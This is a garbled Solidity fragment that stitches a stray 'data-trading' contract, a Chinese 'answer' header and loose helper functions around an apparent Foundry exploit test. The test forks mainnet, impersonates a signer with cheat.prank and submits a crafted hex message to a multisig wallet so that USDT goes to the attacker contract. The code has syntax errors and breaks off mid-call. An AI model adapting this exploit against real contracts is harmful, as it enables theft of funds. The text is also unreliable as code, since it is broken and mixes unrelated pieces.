
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity 0.8.10;

### 答案;
```solidity;

;
;
contract ContractTest is DSTest {
  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
  MultiSig MultiSigWallet =;
    MultiSig(payable(0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6));
  address[] public owner;
  function setUp() public {
    cheat.createSelectFork("mainnet", 15012645)};
  function testExploit() public {
    emit log_named_uint("USDT balance of attacker before Exploit",
      usdt.balanceOf(address(this)));
    emit log_named_uint("How many approval required:",
      MultiSigWallet.required());
    cheat.prank(0xf845A7ee8477AD1FB4446651E548901a2635A915);
    bytes memory msgP1 = hex"fe7f61ea000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000913e1f5a2000000000000000000000000";
    bytes memory recipient = abi.encodePacked(address(this));
    bytes memory receiptId = hex"d48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99ef5479b6";
    bytes memory _message = bytes.concat(msgP1, recipient, receiptId);
    uint256 txId = MultiSigWallet.submitTransaction(0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857,
      0,
      _message,
function reuseDetection(bytes32 key) public {
    require(!used[key]);
    used[key] = true}
function deposit() public payable {
}